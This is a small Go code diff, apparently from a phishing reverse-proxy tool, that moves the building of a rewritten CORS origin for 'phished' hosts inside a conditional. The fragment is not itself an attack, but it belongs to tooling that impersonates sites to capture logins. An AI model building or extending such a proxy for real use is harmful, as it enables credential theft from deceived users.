@@ -614,9 +614,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}else{
 					scheme_origin := strings.Split(origin_from_request, "//")
 					r_origin, ok := p.replaceHostWithPhished(scheme_origin[1])
-					scheme := scheme_origin[0]
-					final_url := scheme + "//" + r_origin
 					if (ok){
+						scheme := scheme_origin[0]
+						final_url := scheme + "//" + r_origin
 						resp.Header.Set("Access-Control-Allow-Origin", final_url)
 					}else{
 						resp.Header.Set("Access-Control-Allow-Origin", "*")
